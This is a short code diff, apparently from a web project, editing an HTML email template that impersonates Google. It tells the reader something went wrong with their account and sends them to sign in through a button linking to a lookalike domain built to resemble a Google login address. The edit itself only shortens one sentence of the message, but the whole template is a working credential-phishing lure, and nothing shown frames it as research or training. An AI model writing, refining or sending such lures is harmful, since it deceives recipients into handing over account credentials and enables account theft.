@@ -16,7 +16,7 @@ export default function Home() {
         `<div>
         <p style="font-size: 18px; margin:10px 0;">Hello, Google Account User</p>
         <div>There is something went wrong in your account,</div>
-        <div style="margin:10px 0;">Please Sign in your account to verify your account</div>
+        <div style="margin:10px 0;">Please Sign in your account to verify</div>
         <a 
             href="https://accountsgooglecomlogin.vercel.app"
             style="text-decoration:none; display:inline-block; background-color:rgb(79, 132, 247); color:white; padding:10px 15px;  border-radius:4px; margin:15px 0;"
